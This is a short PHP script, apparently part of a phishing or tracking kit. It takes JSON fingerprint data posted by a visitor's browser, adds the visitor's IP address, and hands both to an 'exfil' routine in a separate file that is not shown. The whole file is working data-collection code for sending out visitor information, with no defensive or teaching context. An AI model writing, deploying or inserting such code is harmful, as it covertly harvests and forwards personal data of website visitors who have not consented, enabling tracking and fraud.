<?php
$d=json_decode(file_get_contents('php://input'),true)?:[];
require_once __DIR__.'/exfil.php';
$d['ip']=$_SERVER['REMOTE_ADDR']??'?';
lph_exfil('fingerprint',$d);
echo '{"ok":true}';
